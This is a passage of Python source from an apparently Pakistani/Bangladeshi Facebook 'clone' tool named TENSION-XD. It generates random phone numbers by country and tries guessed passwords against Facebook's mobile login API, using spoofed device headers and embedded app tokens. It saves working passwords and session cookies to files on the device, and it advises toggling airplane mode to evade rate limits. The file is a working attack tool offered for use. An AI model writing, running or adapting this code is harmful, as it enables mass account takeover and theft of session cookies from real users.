0','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5110','GT-P5200','GT-P5210','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','SAMSUNG','LMY4','LMY47V','MMB29K','MMB29M','LRX22C','LRX22G','NMF2','NMF26X','NMF26X;','NRD90M','NRD90M;','SPH-L720','IML74K','IMM76D','JDQ39','JSS15J','JZO54K','KOT4','KOT49H','KOT4SM-T310','KTU84P','SM-A500F','SM-A500FU','SM-A500H','SM-G532F','SM-G900F','SM-G920F','SM-G930F','SM-G935','SM-G950F','SM-J320F','SM-J320FN','SM-J320H','SM-J320M','SM-J510FN','SM-J701F','SM-N920S','SM-T111','SM-T230','SM-T231','SM-T235','SM-T280','SM-T311','SM-T315','SM-T525','SM-T531','SM-T535','SM-T555','SM-T561','SM-T705','SM-T805','SM-T820','SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750') 
#<<_________[ METHOD 2 ]_________>>#
def ffb2(ids,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write(f'\r\r{A}[{G1}TENSION-XD{A}]{G1} %s{A} | {G1}M2 \033[1;92mOK/{G1}CP{A} %s/%s {A}'%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": 'en_GB',"client_country_code": 'GB',"method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}        
                        headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": "Dalvik/2.1.0 (Linux; U; Android 10.0.1; Redmi Note 5 Pro Build/RD1A.201105.003.C1) [FBAN/MobileAdsManagerAndroid;FBAV/335.0.0.30.47;FBBV/489275666;FBDM/{density=2.75,width=720,height=1600};FBLC/en_US;FBRV/0;FBCR/Zong;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 5 Pro;FBSV/7.2;FBOP/1;FBCA/x86:armeabi-v7a;]','Dalvik/2.1.0 (Linux; U; Android 12; Pixel 3 Build/SP1A.210812.016.C2) [FBAN/Orca-Android;FBAV/412.0.0.15.69;FBPN/com.facebook.orca;FBLC/en_US;FBBV/481775700;FBCR/Verizon;FBMF/Google;FBBD/google;FBDV/Pixel 3;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2028};FBBK/1;FBLR/0;FB_FW/1;]','[FBAN/FB4A;FBAV/61.0.0.6595;FBBV/61279955;[FBAN/FB4A;FBAV/51.0.0.32.36;FBBV/538346501;FBDM/{density=2.3,width=800,height=1280};FBLC/en_ZA;FBRV/597679001;FB_FW/2;FBCR/Damag Syria;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T280;FBSV/5.1.1;FBOP/19;FBCA/arm64-v8a:;]","X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G} [TENSION-OK] '+ids+'[√]'+pas+'\033[1;97m')
                                        #os.system('espeak -a 300 " Crack,   Successfully,"')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookies = f"sb={ssbb};{coki}"
                                        print(f'\r{G1}[{S}COOKIE🍪{G1}] :{A} '+coki)
                                        open('/sdcard/TENSION-M2-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        open('/sdcard/TENSION-M2-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{R} [TENSION-CP] '+ids+' [√] '+pas+'\033[1;97m')
                                                open('/sdcard/TENSION-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
        	time.sleep(20)
        except Exception as e:
        	time.sleep(20)
#<<_________[ METHOD 3 ]_________>>#
def ffb3(ids,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write(f'\r\r{A}[{G1}TENSION-XD{A}]{G1} %s{A} | {G1}M3 \033[1;92mOK/{G1}CP{A} %s/%s {A}'%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
                        data={'adid': adid,
'format': 'json',
'device_id': str(uuid.uuid4()),
'family_device_id': str(uuid.uuid4()),
'secure_family_device_id': str(uuid.uuid4()),
'cpl': 'true',
'try_num': '1',
'email': ids,
'password': pas,
'method': 'auth.login',
'generate_analytics_claim':'1',
'community_id':'',
'cpl':'true',
'try_num':'1',
'sim_serials': "['80973453345210784798']",
'openid_flow': 'android_login',
'openid_provider': 'google',
'openid_emails': "['01710940017']",
'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
'fb4a_shared_phone_cpl_experiment':'fb4a_shared_phone_nonce_cpl_at_risk_v3',
'fb4a_shared_phone_cpl_group':'enable_v3_at_risk',
'enroll_misauth':'false',
'generate_session_cookies':'1',
'error_detail_type':'button_with_disabled',
'source':'account_recovery',
'generate_machine_id':'1',
'jazoest':'2980',
'meta_inf_fbmeta':'V2_UNTAGGED',
'encrypted_msisdn':'',
'currently_logged_in_userid':'0',
'locale': 'en_US',
'client_country_code': 'US',
'fb_api_req_friendly_name':'autheticate',
'fb_api_caller_class':'Fb4aAuthHandler',
'api_key':'882a8490361da98702bf97a021ddc14d',
'access_token':'256002347743983%7C374e60f8b9bb6b8cbb30f78030438895',
'sig':'4c854da0db9429f4913c2a1b221c1d30'}
                        headers={'Host': 'graph.facebook.com',
'Content-Type': 'application/x-www-form-urlencoded',
'Accept-Encoding': 'gzip, deflate',
'Connection': 'keep-alive',
'POST': '/auth/login HTTP/2',
'Host': 'b-graph.facebook.com',
'Priority': 'u=3, i',
'Content-Type': 'application/x-www-form-urlencoded',
'X-Fb-Sim-Hni': '64301',
'X-Fb-Net-Hni': '64301',
'X-Fb-Connection-Quality': 'GOOD',
'Zero-Rated': '0',
'User-Agent': UBI(),
'X-Fb-Connection-Quality': 'EXCELLENT',
'Authorization': 'OAuth null',
'X-Fb-Connection-Bandwidth': '24807555',
'X-Fb-Connection-Type': 'MOBILE.LTE',
'X-Fb-Device-Group': '6060',
'X-Tigon-Is-Retry': 'False',
'X-Fb-Friendly-Name': 'authenticate',
'X-Fb-Request-Analytics-Tags': 'unknown',
'X-Fb-Http-Engine': 'Liger',
'X-Fb-Client-Ip': 'True',
'X-Fb-Server-Cluster': 'True',
'Content-Length': '2126'}       
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G} [TENSION-OK] '+ids+'[√]'+pas+'|'+TENSION(ids)+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookies = f"sb={ssbb};{coki}"
                                        print(f'\r{G1}[{S}COOKIE🍪{G1}] :{A} '+coki)
                                        open('/sdcard/TENSION-M3-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                                        open('/sdcard/TENSION-M3-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{R} [TENSION-CP] '+ids+' [√] '+pas+'\033[1;97m')
                                                open('/sdcard/TENSION-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
        	time.sleep(20)
        except Exception as e:
        	time.sleep(20)        	
#<<_________[ METHOD 4 ]_________>>#
def ffb4(ids,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write(f'\r\r{A}[{G1}TENSION-XD{A}]{G1} %s{A} | {G1}M4 \033[1;92mOK/{G1}CP{A} %s/%s {A}'%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
                        data = {"adid": str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'family_device_id': str(uuid.uuid4()),'secure_family_device_id': str(uuid.uuid4()),'cpl': 'true','try_num': '1','email': ids,'password': pas,'method': 'auth.login','generate_session_cookies': '1','sim_serials': "['80973453345210784798']",'openid_flow': 'android_login','openid_provider': 'google','openid_emails': "['01710940017']",'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",'error_detail_type': 'button_with_disabled','source': 'account_recovery','locale': 'en_US','client_country_code': 'US','fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}                        
                        headers={'Host': 'graph.facebook.com','Content-Type': 'application/x-www-form-urlencoded','Accept-Encoding': 'gzip, deflate','Connection': 'keep-alive','Priority': 'u=3, i','X-Fb-Sim-Hni': '45204','X-Fb-Net-Hni': '45201','X-Fb-Connection-Quality': 'GOOD','Zero-Rated': '0','User-Agent': api(),'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-Fb-Connection-Bandwidth': '24807555','X-Fb-Connection-Type': 'MOBILE.LTE','X-Fb-Device-Group': '5120','X-Tigon-Is-Retry': 'False','X-Fb-Friendly-Name': 'authenticate','X-Fb-Request-Analytics-Tags': 'unknown','X-Fb-Http-Engine': 'Liger','X-Fb-Client-Ip': 'True','X-Fb-Server-Cluster': 'True','Content-Length': '22'}
                        url = 'https://b-graph.facebook.com/auth/login'                             
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G} [TENSION-OK] '+ids+'[√]'+pas+'|'+TENSION(ids)+'\033[1;97m')
                                        #os.system('espeak -a 300 " Crack,   Successfully,"')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookies = f"sb={ssbb};{coki}"
                                        print(f'\r{G1}[{S}COOKIE🍪{G1}] :{A} '+coki)
                                        open('/sdcard/TENSION-M4-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                                        open('/sdcard/TENSION-M4-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{R} [TENSION-CP] '+ids+' [√] '+pas+'\033[1;97m')
                                                open('/sdcard//TENSION-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
        	time.sleep(20)
        except Exception as e:
        	time.sleep(20)

######RANDOM CLONE###
def Main_Menu():
    clear()
    print(f' {G1}[{A}1{G1}]{G1} PAKISTAN CLONE')
    print(f' {G1}[{A}2{G1}]{G1} BANGLADESH CLONE')
    print(f' {G1}[{A}3{G1}]{G1} INDIA CLONE')
    print(f' {G1}[{A}4{G1}]{G1} NEPAL CLONE')
    print(f' {G1}[{A}5{G1}]{G1} INDONESIA CLONE')
    print(f' {G1}[{A}6{G1}]{G1} AFGHANISTAN CLONE')
    print(f' {G1}[{A}0{G1}]{G1} BACK MENU')
    line()
    option=input(f' {G1}[{A}?{G1}]{G1} CHOICE {A}➢{G1} ')
    if option in ['1','01']:
        pak()
    if option in ['2','02']:
        bd()
    if option in ['3','03']:
        ind()
    if option in ['4','04']:
        nepal()
    if option in ['5','05']:
    	indo()    	
    if option in ['6','06']:
    	afg()
  #  if option in ['7','07']:
       # indo()
    if option in ['0','00']:
        menu()
    else:
    	line()
    print(f'{G1}[{A}?{G1}]{G1}SELECTED WRONG OPTION')
    time.sleep(2)
    menu()
#####____Random-Method-Setup____#####
def pak():
                user=[]
                clear()
                print(f' {G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} 0300{G}/{A}0340{G}/{A}0333{G}/{A}0310')
                code = input(f' {G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} ')
                clear()
                try:
                        limit = int(input(f' {G1}[{A}≈{G1}]{G1}EXAMPLE : 2000, 3000, 5000, 10000\n{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as TENSIONg1:     
                        clear()
                        
                        tl = str(len(user))
                        print(f' {G1}[{A}≈{G1}]{G1} COUNTRY {A}➢{A} PAKISTAN')
                        print(f' {G1}[{A}≈{G1}]{G1} SIM CODE  {A}➢{A} {code}')
                        print(f' {G1}[{A}≈{G1}]{G1} TOTAL UID {A}➢{A} {tl}')
                        print(f' {G1}[{A}≈{G1}]{G1} CRACKING.... {A}')
                        print(f" {G1}[{A}={G1}]{G1} TURN {G1}[{A}ON{G1}/{A}OFF{G1}] AIRPLANE MODE EVERY {A}3{G1} MIN")
                        line()
                        for psx in user:
                                ids = code+psx
                                passlist=[psx,ids,ids[:8],ids[:6],ids[:7],'khan khan','khan1122','khan786','khankhan','malik123','kingkhan','baloch123','pak123','khan123','janjan','pakistan','pakistan786','khan12345','786787','baloch','pubg123','khan1234','firstlast','first last']
                                TENSIONg1.submit(rd,ids,passlist)
                print(f'\033[1;37m')
                print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                print(f' {G1}[{A}≈{G1}]{G1} THE PROCESS HAS BEEN COMPLETED')
                print(f' {G1}[{A}≈{G1}]{G1} TOTAL OK ID {A}➢{G1} {str(len(ok))}')
                print(f' {G1}[{A}≈{G1}]{M} TOTAL CP ID {A}➢{M} {str(len(cp))}')
                print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                input(f' {G1}[{A}≈{G1}]{G1} PRESS ENTER TO BACK ')
                menu()
def bd():
                user=[]
                clear()
                print(f' {G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} 017{G}/{A}019{G}/{A}018{G}/{A}016')
                code = input(f' {G1}[{A}?{G1}]{G1} PUT CODE  {A}➢{G1} ')
                name = ''.join(random.choice(string.digits) for _ in range(2))
                cod = ''.join(random.choice(string.digits) for _ in range(2))
                clear()
                try:
                        limit = int(input(f' {G1}[{A}≈{G1}]{G1}EXAMPLE : 2000, 3000, 5000, 10000\n{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(8))
                        user.append(nmp)
                with tred(max_workers=30) as TENSIONg1:     
                        clear()
                        
                        tl = str(len(user))
                        print(f' {G1}[{A}≈{G1}]{G1} COUNTRY {A}➢{A} BANGLADESH')
                        print(f' {G1}[{A}≈{G1}]{G1} SIM CODE  {A}➢{A} {code}')
                        print(f' {G1}[{A}≈{G1}]{G1} TOTAL UID {A}➢{A} {tl}')
                        print(f' {G1}[{A}≈{G1}]{G1} CRACKING.... {W}')
                        print(f" {G1}[{A}={G1}]{G1} TURN {G1}[{A}ON{G1}/{A}OFF{G1}] AIRPLANE MODE EVERY {A}3{G1} MIN")
                        line()
                        for psx in user:
                                ids = code+psx+cod+name
                                ax = ids[:8]
                                bx = ids[:7]
                                cx = ids[:6]
                                xa = psx[1:]
                                xb = psx[2:]
                                passlist = [ids,ax,bx,cx,xa,xb,code+name+cod+psx,cod+psx,name+psx,code+name+cod+psx,ids,'i love you','iloveyou','free fire','freefire','57273200','Bangladesh','77889900','bangladesh','bangla','jannat','jannatul','mariya','sadiya','farjana','sabbir','rakibul','mahidul','nusrat','tamanna','mimmim','suraiya','alamin','arafat','bushra','roksana','tabassum','tanisha','tasnim','Bangla','@#@#@#','@@@###']
                                TENSIONg1.submit(rd,ids,passlist)
                print(f'\033[1;37m')
                print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                print(f' {G1}[{A}≈{G1}]{G1} THE PROCESS HAS BEEN COMPLETED')
                print(f' {G1}[{A}≈{G1}]{G1} TOTAL OK ID {A}➢{G1} {str(len(ok))}')
                print(f' {G1}[{A}≈{G1}]{M} TOTAL CP ID {A}➢{M} {str(len(cp))}')
